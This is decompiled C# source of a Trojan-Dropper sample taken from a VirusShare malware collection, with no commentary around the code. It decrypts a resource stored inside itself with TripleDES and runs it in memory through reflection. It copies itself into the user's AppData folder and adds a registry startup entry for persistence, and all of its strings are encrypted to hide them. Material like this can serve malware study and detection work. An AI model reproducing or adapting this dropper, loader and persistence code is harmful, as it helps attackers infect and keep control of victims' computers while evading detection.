﻿// Decompiled with JetBrains decompiler
// Type: XDxywCmt
// Assembly: launcherr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 844F7C1A-8FFD-4C74-9D86-01958A0C4B7B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Dropper.Win32.Demp.bbz-fceac36d4e31951c3da229f7ac22e2d5cf88275cf5898ad4f9ca8c1325363ba9.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

public class XDxywCmt
{
  [STAThread]
  public static void Main()
  {
    ResourceManager resourceManager = new ResourceManager("CwlGw", Assembly.GetExecutingAssembly());
    Thread.Sleep(0);
    Assembly.Load(XDxywCmt.mkSHbRIWgP((byte[]) NewLateBinding.LateIndexGet(resourceManager.GetObject("wKxk"), new object[1]
    {
      (object) 1
    }, (string[]) null), "cvPidSxH")).GetType(XDxywCmt.OfGFVLOGeI("+nvVeeBMc4g=", "YuTYVg")).GetMethod(XDxywCmt.OfGFVLOGeI("ktLEUX47dyI=", "HusmFC")).Invoke((object) null, new object[2]
    {
      (object) XDxywCmt.mkSHbRIWgP((byte[]) NewLateBinding.LateIndexGet(resourceManager.GetObject("wKxk"), new object[1]
      {
        (object) 0
      }, (string[]) null), "jyUVeojN"),
      (object) (Environment.GetEnvironmentVariable(XDxywCmt.OfGFVLOGeI("dd7EgAPN/uU=", "SGPniLNtOT")) + XDxywCmt.OfGFVLOGeI("wL8EGK/7KSSVogBp/arvehAVT6kZe7UA93xGe6grs7tlGaEsWxU+JDybno5GZmR/", "bRwGGFKgnu"))
    });
    OcmVVIuVrF.TzSEIh();
  }

  public static string OfGFVLOGeI(string rjJlQBwkFv, string HEPghDENlS)
  {
    TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
    MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
    cryptoServiceProvider1.Key = cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(HEPghDENlS));
    cryptoServiceProvider1.Mode = CipherMode.ECB;
    ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
    byte[] inputBuffer = Convert.FromBase64String(rjJlQBwkFv);
    return Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
  }

  public static byte[] mkSHbRIWgP(byte[] rjJlQBwkFv, string HEPghDENlS)
  {
    TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
    MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
    cryptoServiceProvider1.Key = cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(HEPghDENlS));
    cryptoServiceProvider1.Mode = CipherMode.ECB;
    ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
    byte[] inputBuffer = rjJlQBwkFv;
    return decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
  }

  public static object VTNfcy()
  {
    try
    {
      if (Operators.CompareString(OcmVVIuVrF.BONdg, MyProject.Computer.FileSystem.SpecialDirectories.CurrentUserApplicationData + XDxywCmt.OfGFVLOGeI("wNvw+0Qfeno=", "PJbYvR"), false) != 0)
      {
        File.Copy(OcmVVIuVrF.BONdg, MyProject.Computer.FileSystem.SpecialDirectories.CurrentUserApplicationData + XDxywCmt.OfGFVLOGeI("wNvw+0Qfeno=", "PJbYvR"), true);
        OcmVVIuVrF.iHNJVY = Registry.CurrentUser.OpenSubKey(XDxywCmt.OfGFVLOGeI("GMc4v/kdB7+QHonIxNVdlKWc3YBQRvxI4yPTePW+Fyo3ON6wdX0cAQtn1ZrpoRyt", "wOzEdE"), true);
        OcmVVIuVrF.iHNJVY.SetValue(XDxywCmt.OfGFVLOGeI("ZToohdyo5zKYvWzGdyfHaQ==", "phepHV"), (object) (MyProject.Computer.FileSystem.SpecialDirectories.CurrentUserApplicationData + XDxywCmt.OfGFVLOGeI("wNvw+0Qfeno=", "PJbYvR")), RegistryValueKind.String);
        OcmVVIuVrF.iHNJVY.Close();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    object obj;
    return obj;
  }
}